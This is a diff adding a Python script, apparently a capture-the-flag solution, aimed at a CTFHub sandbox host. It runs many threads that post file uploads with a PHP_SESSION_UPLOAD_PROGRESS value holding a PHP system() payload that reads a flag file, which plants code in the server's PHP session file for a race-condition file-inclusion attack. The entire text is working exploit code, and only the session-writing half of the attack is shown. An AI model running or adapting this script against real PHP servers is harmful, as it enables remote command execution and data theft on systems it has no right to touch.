@@ -1,0 +1,19 @@
+import io
+import requests
+import threading
+
+sess_id = 'Atao'
+
+def write(session):
+    while True:
+        f = io.BytesIO(b'a' * 1024 * 128)
+        session.post(url='http://challenge-18e4262ebeb3e1dc.sandbox.ctfhub.com:10800/',
+                     data={'PHP_SESSION_UPLOAD_PROGRESS': 'aaaaasdasdasd<?php system("cat /flag_is_here_not_are_but_you_find")?>'},
+                     files={'file': ('atao.txt',f)},
+                     cookies={'PHPSESSID': sess_id}
+                     )
+if __name__=="__main__":
+    event = threading.Event()
+    session = requests.session()
+    for i in range(1,80):
+        threading.Thread(target=write,args=(session,)).start()
